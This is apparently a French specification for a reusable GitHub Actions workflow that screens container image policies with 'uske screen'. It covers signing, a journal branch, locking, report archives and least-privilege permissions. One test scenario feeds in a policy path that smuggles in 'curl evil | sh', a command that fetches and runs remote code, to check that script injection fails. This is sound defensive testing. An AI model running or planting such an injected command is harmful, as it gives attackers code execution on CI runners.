## ADDED Requirements

### Requirement: Un job crible une politique par `uske screen`

Le workflow réutilisable `.github/workflows/extra-screen.yml` SHALL se déclencher par
`workflow_call` et prendre deux entrées requises : `policy`, le chemin d'une politique dans le
dépôt appelant, et `registries`, la liste des registres que reçoit le placeur
(`KNOCK_REGISTRIES`, sans identifiants). Il SHALL prendre aussi `transit`, `playbooks` (défaut
`playbooks`), `journal-branch` (défaut `uske-journal`), `report-retention-days` (défaut `90`) et
`package-mirrors` (défaut vide), que le placeur reçoit comme `KNOCK_TRANSFORM_PACKAGE_MIRRORS`.
Il SHALL cribler cette seule politique par `uske screen --policy`, en passant à `--run` l'URL du
run GitHub Actions, à `--work` un répertoire monté dans les conteneurs du juge et du placeur, et à
`--playbooks` et `--transit` les entrées du même nom. Il MUST NOT recopier les étapes d'un
screening : tout passe par le verbe.

#### Scenario: Un appel minimal

- **GIVEN** un dépôt de politiques dont un job déclare
  `uses: trivoallan/uske/.github/workflows/extra-screen.yml@<version>`, avec
  `policy: policies/x.yaml` et `registries`
- **WHEN** le job tourne
- **THEN** `uske screen --policy policies/x.yaml` est lancée une fois
- **AND** chaque ligne que ce screening écrit au journal porte `run` égal à l'URL du run

#### Scenario: Sans entrée requise

- **GIVEN** un appel qui ne fournit pas `policy` ou `registries`
- **WHEN** le workflow est appelé
- **THEN** GitHub refuse l'appel avant tout job, et rien n'est placé

#### Scenario: Le placeur retrouve son plan

- **GIVEN** une politique dont une empreinte est due
- **WHEN** le placeur, lancé dans son conteneur, écrit son plan
- **THEN** `uske` lit ce plan au chemin qu'il a donné, et l'empreinte est jugée

### Requirement: Un trio d'images épinglé par version d'`uske`

Le workflow SHALL désigner les images de `regis` (variante `-full`), de `knock` et de BuildKit par
une version écrite dans le fichier, chacune suivie par un commentaire `# renovate:`. Il SHALL
installer le code d'`uske` de la version que porte le workflow. Il MUST NOT offrir d'entrée qui
remplace l'une de ces images.

#### Scenario: Deux appels à la même version

- **GIVEN** deux dépôts qui appellent le workflow à la même étiquette d'`uske`
- **WHEN** chacun crible une politique
- **THEN** les deux runs lancent les mêmes versions de `regis`, `knock` et BuildKit, et la même
  version d'`uske`

### Requirement: Le placeur signe ce qu'il place

Le workflow SHALL configurer la signature du placeur. Sans le secret facultatif `cosign-key`, il
SHALL signer sans clé (`KNOCK_ATTEST_SIGNER=keyless`), avec l'identité OIDC du run : le job demande
`id-token: write`, et seules les deux variables qui permettent de demander ce jeton atteignent le
conteneur du placeur, par leur nom. Avec `cosign-key` (et `cosign-password`), il SHALL signer par
clé (`KNOCK_ATTEST_SIGNER=key`) : la clé est écrite dans un fichier lisible du seul runner, monté
en lecture seule dans le seul conteneur du placeur. Sans clé, la promotion d'une image réparée
SHALL exiger une signature émise par `token.actions.githubusercontent.com` pour l'identité du
workflow appelé, `trivoallan/uske/.github/workflows/extra-screen.yml`, quel que soit son ref.

#### Scenario: Une image réparée promue sans clé

- **GIVEN** un appel sans `cosign-key`, et une image retenue dans le transit, signée par ce run et
  jugée `direct-placement`
- **WHEN** le placeur la promeut
- **THEN** la signature est vérifiée contre l'identité du workflow appelé, et l'image est promue

#### Scenario: Sans clé

- **GIVEN** un appel sans le secret `cosign-key`
- **WHEN** le placeur place une image
- **THEN** l'image est signée par l'identité OIDC du workflow appelé, et la signature est inscrite
  au journal de transparence public

#### Scenario: Avec une clé

- **GIVEN** un appel qui fournit `cosign-key` et `cosign-password`
- **WHEN** le placeur place une image
- **THEN** l'image est signée par cette clé, et le conteneur du juge ne voit pas la clé

### Requirement: La reconstruction est disponible sur un runner hébergé

Le workflow SHALL lancer un démon BuildKit joignable par le placeur, publié sur la seule boucle
locale, de sorte qu'une politique qui demande une reconstruction ou une remédiation se conduise sur
un runner hébergé par GitHub, sans autre déclaration de l'appelant que les entrées `transit` et
`package-mirrors`.

#### Scenario: Une source à réparer

- **GIVEN** une politique qui déclare une remédiation `rewritePackageSources`, une entrée `transit`,
  une entrée `package-mirrors` qui nomme son miroir, et `ubuntu-latest`
- **WHEN** le workflow la crible
- **THEN** le placeur construit l'image par le démon lancé, et l'image retenue est jugée par sa
  propre empreinte avant toute promotion

#### Scenario: Sans transit

- **GIVEN** la même politique, sans entrée `transit`
- **WHEN** le workflow la crible
- **THEN** la source est consignée `inconclusive`, raison `uske/no-transit`, et rien n'est
  reconstruit

### Requirement: Le journal vit sur une branche dédiée du dépôt appelant

Le workflow SHALL lire et écrire le journal sur la branche `journal-branch` du dépôt appelant,
extraite comme répertoire de résultats d'`uske` avant le screening. Si la branche est absente, le
workflow SHALL la faire naître orpheline, sans autre fichier qu'un `.gitignore` qui écarte
`reports/`. Le workflow MUST NOT écrire sur aucune autre branche.

#### Scenario: Premier run

- **GIVEN** un dépôt sans branche `uske-journal`
- **WHEN** le workflow crible une politique dont une empreinte est due
- **THEN** la branche `uske-journal` existe, sans ancêtre commun avec la branche par défaut
- **AND** elle porte le journal de la politique, et aucun rapport

#### Scenario: Une empreinte déjà décidée

- **GIVEN** une branche `uske-journal` dont le journal porte déjà une décision pour une empreinte
- **WHEN** le workflow crible la même politique, et que le plan porte la même empreinte
- **THEN** le juge n'est pas appelé pour cette empreinte

#### Scenario: La branche par défaut reste intacte

- **GIVEN** un dépôt dont `main` est protégée
- **WHEN** le workflow crible une politique
- **THEN** `main` ne reçoit aucun commit, et le run réussit

### Requirement: Le journal est poussé avant le placement qui suit, et encore à la fin

Après chaque écriture au journal, le workflow SHALL commiter le journal de la politique et le
pousser sur `journal-branch`. Si le push est refusé, il SHALL rejouer sur rebase, trois fois au
plus. Un échec au-delà MUST arrêter la politique, sans rien placer de plus, et faire échouer le job.
À la fin du job, que le screening ait réussi ou non, le workflow SHALL commiter et pousser de
nouveau le journal de la politique, et MUST faire échouer le job si ce dernier push échoue.

#### Scenario: Un push concurrent

- **GIVEN** un autre run qui a poussé le journal d'une autre politique entre deux écritures
- **WHEN** le workflow pousse son journal
- **THEN** le push réussit après un rebase, et les deux journaux sont sur la branche

#### Scenario: Le push échoue avant un placement

- **GIVEN** une branche `journal-branch` sur laquelle le jeton ne peut pas pousser
- **WHEN** le screening écrit sa première ligne de verdict
- **THEN** le job échoue, et le placeur n'a reçu aucun `--apply-plan`

#### Scenario: Le push échoue après un placement

- **GIVEN** un placement fait, et un push de la ligne `placed` refusé par le crochet
- **WHEN** le job se termine
- **THEN** l'étape finale repousse le journal, et la ligne `placed` est sur la branche
- **AND** si ce dernier push échoue aussi, le job échoue

### Requirement: Une politique à la fois, plusieurs politiques en parallèle

Le verrou SHALL porter sur le `metadata.name` de la politique, pas sur son chemin. Deux runs pour
la même politique MUST s'attendre, sans que l'un annule celui qui tourne. Par politique, GitHub ne
garde qu'un seul run en attente : le plus récent l'emporte, et un run en attente annulé ne place
rien. Deux runs pour des politiques de noms différents SHALL tourner ensemble.

#### Scenario: La même politique par deux chemins

- **GIVEN** un run en cours pour `policies/x.yaml`, dont le `metadata.name` est `x`
- **WHEN** un second run est appelé pour `./policies/x.yaml`
- **THEN** le second commence après la fin du premier, et le premier n'est pas annulé

#### Scenario: Trois runs de la même politique

- **GIVEN** un run en cours et un run en attente pour la politique `x`
- **WHEN** un troisième run est appelé pour `x`
- **THEN** le run en attente est annulé sans rien placer, et le troisième attend

#### Scenario: Deux politiques

- **GIVEN** un run en cours pour la politique `x`
- **WHEN** un run est appelé pour la politique `y`
- **THEN** il commence sans attendre, et les deux journaux finissent sur la branche

### Requirement: Les rapports partent en archive attachée au run

Le workflow SHALL publier, sous la forme d'une archive attachée au run, les rapports qu'`uske` a
gardés. L'archive est nommée d'après le `metadata.name` de la politique et conserve le chemin de
chaque rapport relatif aux résultats. Le workflow SHALL la publier même quand le job échoue, avec
la rétention de l'entrée `report-retention-days`. Il MUST NOT commiter les rapports.

#### Scenario: Un refus

- **GIVEN** une politique dont une empreinte est refusée
- **WHEN** le run se termine
- **THEN** l'archive du run contient le rapport que cite la ligne de refus, au chemin exact
  qu'elle cite, `sha256:` compris
- **AND** la branche `journal-branch` ne contient aucun rapport

#### Scenario: Une panne après un jugement

- **GIVEN** un juge qui a rendu son rapport, puis un placeur qui échoue
- **WHEN** le job échoue
- **THEN** l'archive des rapports est publiée quand même

### Requirement: L'issue métier ne fait pas échouer le job

Le job SHALL réussir quand `uske screen` sort en 0, quarantaine et `inconclusive` compris, et
SHALL échouer quand elle sort autrement.

#### Scenario: Une quarantaine

- **GIVEN** une politique dont la seule empreinte est refusée
- **WHEN** le workflow la crible
- **THEN** le job réussit, et le journal porte la ligne de refus

### Requirement: Permissions au plus juste, jeton du dépôt hors des conteneurs, entrées hors des scripts

Le workflow SHALL déclarer les seules permissions `contents: write`, `packages: write` et
`id-token: write`. Il SHALL
accepter un secret facultatif `registry-token`, et une entrée `registry-username` (vide par défaut,
ce qui vaut l'acteur du run). Le registre SHALL être authentifié par ce secret quand l'appelant le
fournit, sinon par `GITHUB_TOKEN`. Seule cette authentification de registre atteint le juge et le
placeur, par leur `config.json`. Le jeton qui pousse le journal MUST NOT être écrit dans un fichier
monté dans leurs conteneurs. Aucune entrée MUST NOT être interpolée dans le texte d'un script : les
entrées passent par l'environnement.

#### Scenario: Un chemin piégé

- **GIVEN** une entrée `policy` qui vaut `x.yaml"; curl evil | sh; "`
- **WHEN** le workflow est appelé
- **THEN** aucune commande n'est lancée en dehors d'`uske` et de ses outils
- **AND** `uske` ne trouve pas la politique, le job échoue, et rien n'est placé

#### Scenario: Un jeton de registre fourni

- **GIVEN** un appel qui fournit le secret `registry-token`
- **WHEN** le juge ou le placeur lit les fichiers montés dans son conteneur
- **THEN** aucun de ces fichiers ne contient `GITHUB_TOKEN`, et leur `config.json` porte le jeton de
  registre

#### Scenario: Sans jeton de registre

- **GIVEN** un appel sans le secret `registry-token`
- **WHEN** le workflow s'authentifie auprès du registre
- **THEN** il emploie `GITHUB_TOKEN`, qui atteint alors le juge et le placeur par `config.json`
- **AND** le jeton qui pousse le journal n'est écrit dans aucun fichier monté

### Requirement: Une étiquette mobile suit chaque version

À chaque version publiée, une étiquette mobile SHALL être déplacée vers le commit de cette
version : `v<majeure>.<mineure>` tant qu'`uske` est en 0.x, puis `v<majeure>` à partir de 1.0.

#### Scenario: Une version 0.x

- **GIVEN** la publication de la version `0.10.2`
- **WHEN** le workflow de l'étiquette mobile tourne
- **THEN** l'étiquette `v0.10` désigne le commit de `0.10.2`, et `v0.9` n'a pas bougé

#### Scenario: Une version 1.x

- **GIVEN** la publication de la version `1.2.0`
- **WHEN** le workflow de l'étiquette mobile tourne
- **THEN** l'étiquette `v1` désigne le commit de `1.2.0`
